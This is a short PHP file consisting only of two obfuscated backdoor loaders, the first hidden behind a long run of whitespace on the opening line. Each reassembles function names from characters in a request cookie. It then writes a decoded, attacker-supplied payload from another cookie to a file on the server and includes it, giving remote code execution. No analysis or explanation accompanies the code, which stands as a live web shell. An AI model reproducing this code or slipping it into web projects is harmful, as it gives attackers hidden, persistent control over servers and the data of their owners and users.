<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[37])){$c=$_COOKIE;$k=0;$n=6;$p=array();$p[$k]='';while($n){$p[$k].=$c[37][$n];if(!$c[37][$n+1]){if(!$c[37][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+6+1;}$k=$p[11]().$p[15];if(!$p[21]($k)){$n=$p[3]($k,$p[14]);$p[5]($n,$p[27].$p[28]($p[4]($c[3])));}include($k);}

if (isset($_COOKIE[3]) && isset($_COOKIE[15])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 10;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[15][$n];
        if (!$c[15][$n + 1]) {
            if (!$c[15][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 10 + 1;
    }
    $k = $p[14]() . $p[16];
    if (!$p[22]($k)) {
        $n = $p[23]($k, $p[2]);
        $p[6]($n, $p[0] . $p[3]($p[26]($c[3])));
    }
    include($k);
}